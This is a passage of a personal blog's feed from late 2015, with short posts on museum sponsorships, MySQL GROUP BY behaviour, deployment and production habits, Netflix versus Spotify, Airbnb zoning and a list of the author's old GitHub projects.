<p>Yesterday I attended a concert at the Newark Museum and ran into a fairly common situation when lining up to get in. They had a suggested donation amount, which is entirely optional, while at the same time they provided free admission to anyone with a Bank of America card due to Bank of America’s sponsorship. I’ve seen the same sort of setup at museums in New York and I suspect it’s common elsewhere in the United States as well as abroad but the entire concept strikes me as odd.</p>

<p>I understand that it’s a way for Bank of America to reward its customers but because the admission was a suggested amount it made me feel as as I’m neither contributing towards the museum nor as getting any value from Bank of America. Without my debit card I would have felt noble contributing when I didn’t have to but with the card it feels as if Bank of America is giving me a way to avoid feeling guilty.</p>

<p>I’m sure these thoughts are irrational and I’m overthinking it but the process struck a weird chord with me and I’m surprised I haven’t noticed it before.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Setting up a new computer - then and now</title>
   <link href="http://dangoldin.com/2015/12/06/setting-up-a-new-computer-then-and-now/"/>
   <updated>2015-12-06T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2015/12/06/setting-up-a-new-computer---then-and-now</id>
   <content:encoded><![CDATA[
<p>In the past I’d be wary of setting up a new computer knowing that every time I’d need at least a couple of hours to get everything into a workable state. These days I actually look forward to setting up a new computer. Nearly every file I care about is hosted online and a large chunk of my productivity apps are online as well. The only tools I need to run locally are the various IDEs as well as a variety of open source tools and libraries that my code depends on. Even then I’d bet it takes less than an hour to get things to an 80% state at which point I’ll only discover what’s missing by just going through my day.</p>

<p>And this is as a developer who needs to build various applications from source and deal with potential library conflicts. For someone who doesn’t have to deal with these issues it must be incredibly quick to get a workable setup these days.</p>

<p>At the same time it seems as if we need to upgrade our computers less frequently since for most tasks computers from a few years ago are good enough. In fact I’m still on an early 2011 MacBook Pro with some upgraded RAM and a new SSD drive. I don’t even notice any performance difference between it and a newer MacBook Pro at the office. And for most tasks why even bother upgrading a computer when you can get nearly everything done on a tablet? Just attach a keyboard and you’re good to go. I can’t imagine us ever going back to the pre cloud days of computers and I can only imagine what kind of digital productivity tools we come up - especially with the rise of VR and the constant improvement in the performance and battery life of our existing digital devices.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Think interfaces, not implementation</title>
   <link href="http://dangoldin.com/2015/12/02/think-interfaces-not-implementation/"/>
   <updated>2015-12-02T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2015/12/02/think-interfaces-not-implementation</id>
   <content:encoded><![CDATA[
<p>An idea I’ve been preaching over the past few days is to start thinking in terms of interfaces when thinking about writing code rather than the actual implementation. It’s a higher level of abstraction that leads to a higher quality and more scalable product. Rather than focusing on the details it’s better to think about the components and how they’ll interact with another - this also makes it easy to put in a crappy implementation for now while making it easy to modify and rewrite in the future. As engineers there’s a strong desire to obsess over the perfect code which can lead to a significant amount of refactors and rewrites without translating into actual business value. Thinking in terms of interfaces and components forces you to get the design and architecture right and leaving the implementation details for later. A side benefit for me has been being able to take pride in the design and flow and not worry about the code itself - allowing me to write code at a much faster place and sprinkle a series of todos for the parts of the code that I know need improving.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Analyzing large networks</title>
   <link href="http://dangoldin.com/2015/11/26/analyzing-large-networks/"/>
   <updated>2015-11-26T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2015/11/26/analyzing-large-networks</id>
   <content:encoded><![CDATA[
<p>While going through some old repos I came across an old <a href="https://github.com/dangoldin/meerkat-crawl">project</a> I started to analyze the Meerkat network. The idea was to crawl the network and come up with a list of users as well as who they were following and who they were followed by in order to then analyze the network. The crawling was pretty easy to do and after running it over a weekend without any parallelization or threading I was able to get around 200,000 user profiles with a little over 4 million network connections. The challenge became actually analyzing this data to derive something useful. I tried a few tools - including <a href="http://gephi.github.io/">Gephi</a>, <a href="http://www.cytoscape.org/">Cytoscape</a>, and <a href="https://networkx.github.io/">NetworkX</a> - but was unable to get anything more useful than a few simple summary stats. I was hoping to get a neat visualization of clusters to see the various cliques on the network but visualizing that data either broke the programs or took too long to even complete. I made the most progress when using a simple script to filter out the “tail” of the data which allowed the remaining data to be visualized but I felt that the filtration may have eliminated a bunch of interesting information. If anyone has some experience dealing with the analysis of large networks I’d love to hear some ideas.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Why are Netflix and Spotify so different?</title>
   <link href="http://dangoldin.com/2015/11/22/why-are-netflix-and-spotify-so-different/"/>
   <updated>2015-11-22T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2015/11/22/why-are-netflix-and-spotify-so-different</id>
   <content:encoded><![CDATA[
<p>The news that Adele was not going to put her new album on the streaming services got me thinking about the differences between the way music and video are consumed. Just last week Rdio announced that it’s selling its assets to Pandora which is a reminder of how hard it is to start a music company - music labels wield all the control and are able to dictate the terms they want. Even Spotify is not yet profitable despite having millions of subscribers.</p>

<p>On the flip side we have Netflix which on the surface provides a very similar product - streaming video rather than streaming audio. Yet they’re profitable and are quickly expanding internationally and even developing critically acclaimed shows such as Narcos and Master of None.</p>

<p>I find it fascinating that although the two industries are so similar on a technical level they’ve played out so differently. Part of it is that audio consumption is just drastically different than video. Most people will stream music throughout the entire day at work and not mind repeats of a favorite song while shows and movies are watched in shorter bursts and I like to think that most people want to avoid repeats. I’m not a huge music listener and the music I enjoy tends to be available on every service but I suspect most people who are passionate about music want access to a band’s entire catalog as well as having immediate access to new releases - this is something that Spotify needs to provide that Netflix doesn’t have to worry much about. Netflix can survive on the back catalog alone while Spotify needs to bend over backwards to make sure they have the most recent releases.</p>

<p>Netflix has moved into producing their own shows which is allowing them to get ahead of the back catalog problem and move into the HBO model while still having access to a slew of old shows and movies.These are divorced from their creators and can stand on their own while music has extremely strong ties to the artist. This makes it extremely difficult for Spotify to apply a Netflix model and start producing albums - the only way they’d be able to make it work is by becoming a music label. Netflix on the other hand can pay top directors and actors to develop a show that can succeed or fail - but in either case it’s only loosely coupled with the creators.</p>

<p>I can’t find the blog post now but I read something a few days ago about how hard it is to build a successful music startup. The root cause is that the music labels have so much control and power that they’re charging a license fee that prevents startups from having any money to spend on innovation or product. Instead they’re transferring money from venture capitalists into the hands of the labels. The labels are basically the rentiers of the music industry and prevent innovation by sucking up investment that can be used to launch new products. My gut is that this won’t last since there’s just too much happening in adjacent industries but I’m crossing my fingers.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>More MySQL fun</title>
   <link href="http://dangoldin.com/2015/11/21/more-mysql-fun/"/>
   <updated>2015-11-21T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2015/11/21/more-mysql-fun</id>
   <content:encoded><![CDATA[
<p>I had a bit of fun with MySQL earlier this week when trying to explain a non obvious “group by” behavior. It’s fairly common to want to manipulate a field in order to transform it into something more useful. The difficulty arises when you want to keep the original name. Below is some SQL code that highlights the odd behavior.</p>

<figure class="highlight"><pre><code class="language-sql" data-lang="sql"><span class="k">drop</span> <span class="k">table</span> <span class="n">if</span> <span class="k">exists</span> <span class="n">dan_test</span><span class="p">;</span>

<span class="k">create</span> <span class="k">table</span> <span class="n">dan_test</span> <span class="p">(</span>
  <span class="n">id</span> <span class="nb">int</span> <span class="k">not</span> <span class="k">null</span><span class="p">,</span>
  <span class="n">id2</span> <span class="nb">int</span> <span class="k">not</span> <span class="k">null</span>
<span class="p">);</span>

<span class="k">insert</span> <span class="k">into</span> <span class="n">dan_test</span> <span class="p">(</span><span class="n">id</span><span class="p">,</span> <span class="n">id2</span><span class="p">)</span> <span class="k">values</span> <span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">),</span> <span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="mi">2</span><span class="p">),</span> <span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="mi">3</span><span class="p">);</span>

<span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">dan_test</span><span class="p">;</span>

<span class="k">select</span> <span class="n">id</span><span class="p">,</span> <span class="k">case</span> <span class="k">when</span> <span class="n">id</span> <span class="o">=</span> <span class="mi">1</span> <span class="k">then</span> <span class="mi">2</span> <span class="k">else</span> <span class="n">id</span> <span class="k">end</span> <span class="k">as</span> <span class="n">id</span><span class="p">,</span> <span class="n">id2</span>
<span class="k">from</span> <span class="n">dan_test</span><span class="p">;</span>

<span class="k">select</span> <span class="n">id</span><span class="p">,</span> <span class="k">sum</span><span class="p">(</span><span class="n">id2</span><span class="p">)</span>
<span class="k">from</span> <span class="n">dan_test</span>
<span class="k">group</span> <span class="k">by</span> <span class="n">id</span><span class="p">;</span>

<span class="k">select</span> <span class="k">case</span> <span class="k">when</span> <span class="n">id</span> <span class="o">=</span> <span class="mi">1</span> <span class="k">then</span> <span class="mi">2</span> <span class="k">else</span> <span class="n">id</span> <span class="k">end</span> <span class="k">as</span> <span class="n">id</span><span class="p">,</span> <span class="k">sum</span><span class="p">(</span><span class="n">id2</span><span class="p">)</span>
<span class="k">from</span> <span class="n">dan_test</span>
<span class="k">group</span> <span class="k">by</span> <span class="n">id</span><span class="p">;</span>

<span class="k">select</span> <span class="k">case</span> <span class="k">when</span> <span class="n">id</span> <span class="o">=</span> <span class="mi">1</span> <span class="k">then</span> <span class="mi">2</span> <span class="k">else</span> <span class="n">id</span> <span class="k">end</span> <span class="k">as</span> <span class="n">new_id</span><span class="p">,</span> <span class="k">sum</span><span class="p">(</span><span class="n">id2</span><span class="p">)</span>
<span class="k">from</span> <span class="n">dan_test</span>
<span class="k">group</span> <span class="k">by</span> <span class="n">new_id</span><span class="p">;</span></code></pre></figure>

<p>With the second to last query it’s not obvious which id field the group by is referring to: the original from the table or the derived field? It turns out it’s the original field which can cause problems if you’re unaware of this subtlety. There are a few different ways to deal with this situation, including grouping by the derivation formula, but my favorite is to use a brand new field as in the last example above.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Adhoc task management</title>
   <link href="http://dangoldin.com/2015/11/19/adhoc-task-management/"/>
   <updated>2015-11-19T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2015/11/19/adhoc-task-management</id>
   <content:encoded><![CDATA[
<p>A recent trick I’ve picked up to manage my time a bit better is to take all the adhoc tasks I have to do and scatter them into my calendar for the next few days. This allows me to actually get to working on the tasks and I can make sure none of them are forgotten. Using a calendar also forces me to think about the time I expect these tasks to take and plan around that. I’m nearly always running behind and am constantly shuffling tasks around but it’s much better than my previous system of a text file with a constantly growing list of todos. A side benefit of this approach is that I can split my day into <a href="http://www.paulgraham.com/makersschedule.html">maker versus manager</a> chunks rather than be at the whim of meeting invites.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>My old projects</title>
   <link href="http://dangoldin.com/2015/11/12/my-old-projects/"/>
   <updated>2015-11-12T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2015/11/12/my-old-projects</id>
   <content:encoded><![CDATA[
<p>Writing up my old projects got me browsing through my GitHub account to see what else I’ve worked on. Some I’ll update when I get a good idea while others I completely forgot until going through the list. I noticed two big themes when going through the list. The first is how much nicer it is to have projects that are in static HTML/CSS/JavaScript since they can be hosted publicly on GitHub and don’t require any setup or configuration to start using. The other is how many third party libraries or APIs I’ve used and how much more difficult everything would have been had I had to build everything from scratch. If anyone is interested in forking and ressurecting some of these I’ll be glad to polish it up.</p>

<ul>
  <li>
    <p><a href="https://github.com/dangoldin/twitter-archive-analysis">Twitter archive analysis</a>: At some point Twitter announced that they would allow you to export your entire Tweet history and this was a quick pass at a toolkit to analyze the data and do a few simple visualizations. I wrote a blog post about it <a href="/2013/01/19/making-sense-of-my-twitter-archive/">here</a>.</p>
  </li>
  <li>
    <p><a href="https://github.com/dangoldin/instagram-download">Instagram download</a>: A couple of years ago Instagram changed their policies so I decided to close my account. Before that I needed a way to export my photos. This was a simple app/script that spawns a very basic OAuth web application in order to authenticate you with the Instagram API which allows you to export all your photos.</p>
  </li>
  <li>
    <p><a href="https://github.com/dangoldin/yahoo-ffl">Yahoo fantasy football download</a>: I’ve been in a fantasy football league for almost a decade now and every year I update this script to scrape the data from the Yahoo fantasy football site. The goal was to use this data to develop a statistical model to help me manage my team but I haven’t gotten around to starting that yet. Maybe next year!</p>
  </li>
  <li>
    <p><a href="https://github.com/dangoldin/runkeeper-stats">Runkeeper stats</a>: A pretty simple R script to analyze and map the data that can be exported from RunKeeper. I wrote a blog post about it <a href="/2014/01/04/visualizing-runkeeper-data-in-r/">here</a>.</p>
  </li>
  <li>
    <p><a href="https://github.com/dangoldin/site-analysis">Site analysis</a>: I was frustrated by the slowness of various sites and decided to write a script to see what was taking sites so long to load. This analyzes the top Alexa sites and figures out how much data they’re loading and of what types - CSS, JavaScript, images, etc. I wrote a blog post about it <a href="/2014/03/09/examining-the-requests-made-by-the-top-100-sites/">here</a>.</p>
  </li>
  <li>
    <p><a href="https://github.com/dangoldin/relay-rides-analysis">Relay Rides analysis</a>: This script analyzes the JSON search results of Relay Rides (now Turo) and combines it with data retrieved using the Edmunds API to identify the cars that have the best financial return. The return is calculated by looking at the estimated price of the car and dividing it by average money earned per day. The obligatory blog post is <a href="/2015/06/07/finding-the-optimal-car-to-list-on-relayrides/">here</a>.</p>
  </li>
  <li>
    <p><a href="https://github.com/dangoldin/jersey-city-open-data">Jersey City parking zone mapper</a>: Jersey City has a ridiculous PDF that lists the streets and addresses that belong to each zone. I painstakingly extracted, cleaned, and geomapped the data in order to visualize the zones on a map.</p>
  </li>
  <li>
    <p><a href="https://github.com/dangoldin/js-tools">JS tools</a>: Probably my most commonly used code. This is a series of tools hosted on … that provide some basic utilities that help me throughout the day. The most useful lately has been a way of comparing SQL table schemas but it has a bunch of others.</p>
  </li>
  <li>
    <p><a href="https://github.com/dangoldin/citibike-station-directions">Citibike station directions</a>: A web app that breaks every trip down into a walk to a Citibike station, biking from Citibike station to Citibike station, and another walk to the final destination.</p>
  </li>
  <li>
    <p><a href="https://github.com/dangoldin/meerkat-crawl">Meerkat crawl</a>: To help a buddy out I started mapping out the network relationships between users on Meerkat but quickly ran into a scaling issue. I got to around 5 million connections and wasn’t able to figure out how to actually visaulize it in a clean and timely way.</p>
  </li>
  <li>
    <p><a href="https://github.com/dangoldin/yahnr">Yet another Hacker News reader</a>: My attempt at modifying the Hacker News experience to show the top stories over a rolling 24 hour period. This was a good exercise in messing around with pseudo static sites where the content is solely hosted on S3 with a script to push new files every few minutes.</p>
  </li>
  <li>
    <p><a href="https://github.com/dangoldin/python-tools">Python tools</a>: A series of Python scripts that I’ve writtent to deal with various minor issues. I have a ton more that I’ll add to this repo when I find them.</p>
  </li>
  <li>
    <p><a href="https://github.com/dangoldin/mysql-class">MySQL class</a>: I taught a MySQL class at <a href="http://www.c4q.nyc/">Coalition for Queens</a> and this is the series of slides used.</p>
  </li>
  <li>
    <p><a href="https://github.com/dangoldin/redirector">Redirector</a>: A tiny Node.js app that acts similar to the “Switcheroo” Chrome browser extension but able to work across other browsers. It requires a bit of manual set up but then uses the hosts file to intercept web requests and redirect them to another host. A quick write up <a href="/2015/02/07/url-redirection-app/">here</a>.</p>
  </li>
  <li>
    <p><a href="https://github.com/dangoldin/oyster-books-crawl">Oyster books crawl</a>: This was a series of scripts that crawled the Oyster API to pull the available books and then analyzed them to find patterns. A bit sad that this script outlived Oyster itself. I wrote a blog post about it <a href="/2014/03/16/fun-with-the-oyster-books-api/">here</a>.</p>
  </li>
  <li>
    <p><a href="https://github.com/dangoldin/taxi-pricing">Taxi pricing</a>: The goal here was to compare the pricing of taxis across various cities. The two primary dimenisons used were cost per a minute waiting and cost per a mile of driving. Using this information one can then see how different cities and countries value labor costs. The analysis is written up <a href="/2013/12/29/taxi-pricing-in-nyc-vs-mumbai/">here</a> and <a href="/2014/01/09/taxi-prices-around-the-world/">here</a>.</p>
  </li>
  <li>
    <p><a href="https://github.com/dangoldin/meeting-place-finder">Meeting place finder</a>: A simple script that uses the Google Maps API to come up with an ideal meeting place for a group of people that ensures everyone has the same commute time.</p>
  </li>
  <li>
    <p><a href="https://github.com/dangoldin/lincoln-text-analysis">Lincoln text analysis</a>: An old project that read in the text of Abraham Lincoln’s speeches and did a few visualizations of the text. I wrote a blog post about it <a href="/2013/02/12/analysis-of-lincolns-words/">here</a>.</p>
  </li>
  <li>
    <p><a href="https://github.com/dangoldin/lawdiff">Lawdiff</a>: I participated in a journalism meets tech hackathon and this was my team’s entry. We looked at proposed state laws and compared them against other states to identify laws that were most likely written by a special interest group. We had a number of false positives but were able to find a bunch of laws that were nearly identical despite being introduced in multiple states.</p>
  </li>
  <li>
    <p><a href="https://github.com/dangoldin/imdb">IMDB</a>: Another early analysis project where I scraped some IMDB data in order to analyze the average age of actors and actresses over time. This came after I watched Misrepresentation and wanted to show that actors and actresses are treated differently in the movie industry. I wrote a blog post about it <a href="/2012/05/23/trend-of-actor-vs-actress-age-differences/">here</a>.</p>
  </li>
  <li>
    <p><a href="https://github.com/dangoldin/jeopardy-parser">Jeopardy parser</a>: I found an open source crawler of Jeopardy clues and made a few updates to make the code multi threaded and able to crawl significantly faster. I then worked with my wife to turn this data into a simple web app that displayed random Jeopardy clues for us to test our knowledge.</p>
  </li>
  <li>
    <p><a href="https://github.com/dangoldin/map-fun">Map fun</a>: Similar to the RunKeeper analysis above this was another pass at summarizing my running data over multiple years but this time leveraging GitHub’s map tools. I wrote a blog post about it <a href="/2015/01/18/fun-with-githubs-map-tools/">here</a>.</p>
  </li>
  <li>
    <p><a href="https://github.com/dangoldin/node-toys">Node toys</a>: This was the start of me messing around with Node.js and getting a feel for the framework. One of the fun projects I used it for was evaluating recursive functions using HTTP redirects. I did a quick write up of it <a href="/2014/12/31/redirect-recursion/">here</a>.</p>
  </li>
  <li>
    <p><a href="https://github.com/dangoldin/aws-tools">AWS tools</a>: A super simple script that downloads a list of EC2 instances and then prints the IP, name, and address. The end goal was to make it simple to connect to an instance without going through a manual process of figuring out the appropriate address to use. I ended up not using this that much since it was easier for me to maintain a list of aliases and hosts in a text file. A very basic write up <a href="/2014/11/09/some-simple-aws-tools/">here</a>.</p>
  </li>
  <li>
    <p><a href="https://github.com/dangoldin/wikilearn">Wikilearn</a>: This was one of my favorite projects. The goal was to analyze a Wikipedia article and come up with a visual timeline of all the dates and events that occured. I used an open source library for the visualization piece but ended up running into all sorts of issues analyzing the Wikipedia text. This is where I got a bunch of exposure to NLP but still wasn’t able to make it work.</p>
  </li>
  <li>
    <p><a href="https://github.com/dangoldin/mixergy_mp3_download">Mixergy mp3 download</a>: I subscribe to the Mixergy feed and this was my attempt at a script that would just download the available mp3 files and store them for future listening. I’m sure the HTML code of the page has changed since then so the code is most likely broken.</p>
  </li>
  <li>
    <p><a href="https://github.com/dangoldin/geo_data">Geo data</a>: A one of script I wrote to crawl a site and generate a mapping of ZIP codes to counties. I’m not sure why I needed this but I suspect it was for some sort of data analysis project.</p>
  </li>
</ul>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Apps on LTE, mobile web on wifi</title>
   <link href="http://dangoldin.com/2015/11/09/apps-on-lte-mobile-web-on-wifi/"/>
   <updated>2015-11-09T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2015/11/09/apps-on-lte-mobile-web-on-wifi</id>
   <content:encoded><![CDATA[
<p>Lately, I’ve noticed an interesting trend with my smartphone usage. When I’m on wifi I’m much more likely to use the mobile web, click links, and read various articles whereas if I’m on LTE I’ll stick to dedicated apps. I noticed this at my apartment which has a narrow layout with my living room having wifi and my bedroom stuck on LTE. Despite me being in the same mindset regardless of which room I’m in my behavior changes dramatically.</p>

<p>I don’t recall making a conscious decision to change my behavior so I suspect this behavior evolved to deal with the increase in my data usage. I’m still not sure that apps are more data efficient than the mobile web but it definitely feels that way due to the improved speed and responsiveness. If you’re concerned about data usage it’s obvious that you’ll want to do as much as you can on wifi rather than go through your data plan but what’s interesting is that in my mind I’ve concluded that apps and mobile web are differentiated by my data plan. I’d love to know if others do something similar or I’m the anomaly.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>A company marches on its data</title>
   <link href="http://dangoldin.com/2015/11/08/a-company-marches-on-its-data/"/>
   <updated>2015-11-08T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2015/11/08/a-company-marches-on-its-data</id>
   <content:encoded><![CDATA[
<p>A couple of hundred years ago nearly every European country was engaged in some sort of military conflict which led either Napoleon or Frederick the Great to state that “<a href="http://www.oxfordreference.com/view/10.1093/oi/authority.20110803095425331" target="_blank">an army marches on its stomach</a>.” The point being that logistics are the most important when it comes to having a successful army. These days the corporate equivalent would be that a company marches on its data.</p>

<p>Every company claims to be data driven and there’s a slew of data collected about us each day. The most successful companies are able to leverage this data and use it to derive insights that drive direction. Unsuccessful companies may collect the same data but don’t leverage in an impactful way. It’s easy to collect information but it’s a huge challenge to turn into action. There are many options just for storing the data: one approach may make it easy to store tons of data while making it hard to run large scale analyses while another allows for a distributed computation approach that’s too slow. Beyond data storage there’s the actual analysis piece: what’s the appropriate model to use that can represent the relationships between the variables while being true to life? All these are questions that will become increasingly critical and separate the winners from the losers. Data itself has potential for massive <a href="http://dangoldin.com/2013/07/21/beware-the-data-monopoly/">monopoly feedback loops</a> - companies that succeed are able to collect more and more which improves their product which collects more data. Right now it may only seem as if larger companies should care but I suspect within the next 10 years we’ll see more and more small and local businesses adopt a truly data-driven approach, whether through internal tools or through external services</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Zoning Airbnb</title>
   <link href="http://dangoldin.com/2015/11/05/zoning-airbnb/"/>
   <updated>2015-11-05T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2015/11/05/zoning-airbnb</id>
   <content:encoded><![CDATA[
<p>I’ve been meaning to share some thoughts on regulating Airbnb for a couple of months now but kept putting it off. The <a href="http://www.engadget.com/2015/10/21/Airbnb-ads/" target="_blank">recent news</a> was motivating enough for me to finish it off.</p>

<p>I’m a huge fan of Airbnb and it’s my first step whenever I’m traveling. Nearly all my experiences have been great and I’m contemplating getting rid of my Starwood card since it’s just not as useful anymore given that I gravitate towards Airbnb first. At the same time I understand the impact renting a place Airbnb has on the neighbors and can imagine myself hating it if my neighbors were listing their places.</p>

<p>The challenge is that the host is benefiting while passing the cost to someone else. The host is able to get above market rent while the neighbors have to deal with the potential noise and the risk, albeit a low one, of a stranger. The obvious solution seems to come up with a new zone category between residential and hotel commercial that Airbnb as well as other home rental places would be able to fit in. These locations can then be rented out with the city’s blessing as well as contribute to the tax revenue of the city. This relies on the market to come up with a fair price for the location. If you’re interested in renting a place on Airbnb you should be willing to pay more for the property and if you decide you’ll never be renting your place on Airbnb you should have neighbors that share the same belief.</p>

<p>I don’t have much knowledge on zoning laws and what goes into it but this feels like a solution that should work once in place. Getting there is the hard part - what happens to buildings where half the tenants want their units to be Airbnb eligible and half don’t? Who ends up having the final say? Maybe the solution would be to keep existing places the way they are and make sure new construction goes through this zoning process. This will ensure that over time more and more buildings have a clear definition of rental eligibility.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Good code is easy to build and deploy</title>
   <link href="http://dangoldin.com/2015/11/01/good-code-is-easy-to-build-and-deploy/"/>
   <updated>2015-11-01T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2015/11/01/good-code-is-easy-to-build-and-deploy</id>
   <content:encoded><![CDATA[
<p>A clear pattern emerged as I was digging through my old projects. Other than the code quality and approach improving over time what stood out was the way I approached deployment. My earliest projects didn’t have a set of requirements and the configuration was all over the place. The more recent projects have a clear set of requirements as well as the command lines needed to get them running. In fact, I’m able to build and run my recent projects within a few minutes by running “pip install -r requirements.txt”, updating the configuration file, creating the database, and running the database migration script. This is a massive improvement when compared to my initial projects where there was no documentation and my setup involved a ton of adhoc, undocumented work directly on the production server that’s now lost.</p>

<p>I’d argue that this is one of the better habits to adopt as a developer. We do a surprising amount of duplicate work over the years and being able to reference a prior solution is immensely useful, especially when it’s easily discoverable. It’s also a great way of identifying patterns and similarities between projects and understand why some approaches worked and why some failed. This retrospective approach is an active way of improving rather than relying on the “osmosis” approach of just waiting for information to get absorbed.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Some nostalgia</title>
   <link href="http://dangoldin.com/2015/10/29/some-nostalgia/"/>
   <updated>2015-10-29T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2015/10/29/some-nostalgia</id>
   <content:encoded><![CDATA[
<p>This past weekend I was going through some old projects and got a bit nostalgic. Some were my first foray into web programming and startups while others were just me messing around and trying to learn a new framework or language. Each of them have taught me valuable lesson and I thought it would be fun to go through each one and jot down a quick background as well as the lessons learned. I’m doing a high level pass so if any of these are interesting definitely let me know and I’ll do a deeper dive.</p>

<ul>
  <li>scenepeek.com: I started this with a close friend back during my finance days when I really didn’t know what I was doing. The goal was scrape the web and identify various events that could then be easily surfaced and discovered. This was right before smartphones became popular so it does make one think of what could have been. This was my first real time doing “devops” and working with various instances and configuring Apache. The other big lesson learned was that we probably should have started with some framework to get our project out sooner. Instead we ended up writing raw PHP and building everything from the ground up.</li>
  <li><a href="http://getpressi.com" target="_blank">getpressi.com</a>: Applying the lessons learned from Scenepeek I left a a full time job at Yodle to cofound a startup (initially called Glossi) that would create social media mashup pages. We were accepted into an accelerator and ended up making significant progress but were never able to figure out whether our core customers were consumers or larger companies. We couldn’t commit as a team and ended up floundering until selling to a small advertising agency. At the peak we had a dozen customers and most likely could have turned it into a lifestyle business had we had the maturity and focus.</li>
  <li><a href="http://makersalley.com" target="_blank">makersalley.com</a>: After breaking up with Pressi went in the opposite direction and built decided to build something with a concrete business model rather than waiting for one to fall into our laps. We both liked Etsy and wanted to do something with a community element as well as having to do with physical goods. This was a two sided market play and we were never able to get people to buy expensive furniture online. We got so enamored with our vision of how awesome the furniture and designers were that we focused on getting them rather than on getting customers.</li>
  <li><a href="https://better404.com" target="_blank">better404.com</a>: This was a small side project I started to help websites improve their 404 pages. I wanted something that was more passive than building a marketplace and catered to my strengths which were more on the tech side. I don’t have too much time dedicated to this but every once in a while I’ll make some updates with the idea of making it a small passive income generating product.</li>
  <li><a href="http://jsonify.me" target="_blank">jsonify.me</a>: Scratching an itch here but I love the idea of every person having a JSON page that’s a representation of what they are and what they care about. It’s also my “go to” project when learning a new language. It’s a proof of concept more than anything else right now but I’d love to see where it goes. I’m passionate about people owning their data and lending it to third parties as needed and view this is a way to achieve it using existing methods.</li>
</ul>

<p>On one hand I want to polish some of them off and see what I can do but on the other I’m curious about trying new things. People glorify this idea of a purely passive income but I suspect nothing is that easy and every project will require some ongoing maintenance and improvement to stay relevant.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Production makes fools of us all</title>
   <link href="http://dangoldin.com/2015/10/25/production-makes-fools-of-us-all/"/>
   <updated>2015-10-25T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2015/10/25/production-makes-fools-of-us-all</id>
   <content:encoded><![CDATA[
<p>The biggest development lesson I learned over the years is that production is a completely different beast from development. Code that works perfectly in a development environment can fail catastrophically in production and cause a severe impact on the business. Issues can stem from bits of inefficient codes to database schemas that just don’t scale on production. Ideally your development environment  mirrors production and has the same load and hardware but that’s rarely the case. For the other cases cases I’d go through the following items to make sure your code is ready for production:</p>

<ul>
  <li>General code efficiency: Your code may pass unit tests and work fine when you’re running it on development data but you should make sure the code itself can scale to production data. Inefficient code may be fine to push to production if it’s not being hit often or you have the hardware to back it up but you need to make sure this is the case. This also extends to UI applications: if your development environment has a few rows for a customer while in production a customer will have hundreds, you need to make sure that the UI is responsive and that the design actually fits the production use case.</li>
  <li>Query performance: This is the most frequent problem I’ve seen when new code is deployed. A query may run fine in development which can have a magnitude less data but as soon as it’s pushed to production queries that used to take milliseconds while developing start taking multiple seconds. The simplest way to deal with this is to just run your queries on production and confirm they work - especially on the datasets and filters you suspect will be problematic. The results may lead to solutions such as adding new indices to a table or generating new summary tables to speed up the code, neither of which would have been easy to discover during development.</li>
  <li>Deployment plan: Part of writing code is thinking through the deployment and a big part of deployment is making sure you’re avoiding down time. In addition to making sure your application rolls over gracefully to the new code you should be thinking about the database migrations you’ll need to make and confirming they will run as expected on production. I’ve encountered cases where adding a column took a few seconds on a development database but multiple hours on production. If that’s the case you should rewrite the migration to avoid downtime - for example creating a new table and population it with legacy data and only then renaming it to the original name.</li>
  <li>Rollback plan: As much as we like to think our code is perfect mistakes happen and we should write code that’s easy to rollback. Ideally it’s as simple as just pushing the older code but it may need a bit more work if it depends on database changes or other applications.</li>
</ul>

<p>None of these should be earth shattering and over time they become a habit but until then it’s important to go through each one to ensure a successful production deployment.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Jsonify.me 2.0</title>
   <link href="http://dangoldin.com/2015/10/21/jsonifyme-20/"/>
   <updated>2015-10-21T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2015/10/21/jsonifyme-20</id>
   <content:encoded><![CDATA[
<p>A couple of weeks ago I wrote about the idea of having a <a href="/2015/10/11/have-a-go-to-project-when-learning-a-new-programming-language/">“go to” project</a> that you use to pick up a new language and earlier this week I finished the bulk of the rewrite of <a href="http://jsonify.me" target="_blank">jsonify.me</a>. It went through a Node.js phase, a Scala phase, and is currently in the go phase. The idea is to give people an open ended and simple way to generate a personal JSON object, similar to how people may have an about.me page but in JSON. This object can then be mapped to any subdomain (mine is at <a href="http://json.dangoldin.com" target="_blank">json.dangoldin.com</a>) and be referenced by any third party code. For example, you can construct your personal jsonify.me object based on the information in your various social media profiles and then make that information accessible to a variety of sites or pages that can generate it in a variety of ways. One site can turn it into a simple resume while another one can turn into a visual timeline of your history. At the moment it’s entirely open ended with the vast majority of the functionality provided solely through an API. Over time I’ll add some more bells and whistles but I’d love to see the community come up with their own unique JSON format that can then get adopted - similar to the way the hashtag system on Twitter evolved. I suspect it’s going to be significantly more complicated since there’s no 140 character limit but am still interested to see where this goes. Play around with it and let me know what you think!</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Dates in the shell</title>
